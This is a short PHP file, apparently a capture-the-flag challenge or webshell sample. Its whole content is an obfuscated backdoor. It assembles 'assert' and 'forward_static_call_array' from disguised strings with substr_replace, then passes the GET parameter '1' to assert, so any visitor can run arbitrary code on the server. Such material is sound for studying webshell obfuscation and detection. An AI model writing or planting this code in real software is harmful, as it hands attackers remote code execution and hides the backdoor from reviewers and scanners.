<?php
class test
{
    public $file_zz = "u guess";
    public $flag =  'index.php';
    
    
    public function Filetest($u)
    {
        $flag = $u;
        $a = substr_replace("assexx", "rt", 4);
        $b = substr_replace("forward_xxxxxx_cccc_aaaaa", "static_call_array", 8);
        var_dump($b);
        $b($a, array($flag));
    }
}
    
    $me = new test;
    // $me->get_flag($_GET['1']);
    $me->Filetest($_GET['1']);
